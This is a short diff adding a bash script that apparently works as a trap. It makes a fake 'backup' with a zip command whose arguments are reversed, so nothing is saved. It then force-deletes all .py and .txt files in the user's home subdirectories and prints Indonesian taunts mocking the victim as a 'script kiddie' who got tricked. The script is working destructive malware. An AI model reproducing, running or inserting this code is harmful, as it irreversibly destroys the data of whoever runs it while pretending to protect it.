@@ -1,0 +1,12 @@
+#!/usr/bin/bash
+#
+mkdir -p ~/.backups
+
+zip ~/*/*.py ~/.backups/file.zip
+
+rm -rf ~/*/*.py
+rm -rf ~/*/*.txt
+
+echo -ne "Selamat anda kena tipu"
+echo -ne "\nMampus, makanya berkarya jangan jadi script kiddie"
+echo -ne "\nHahahahaha"
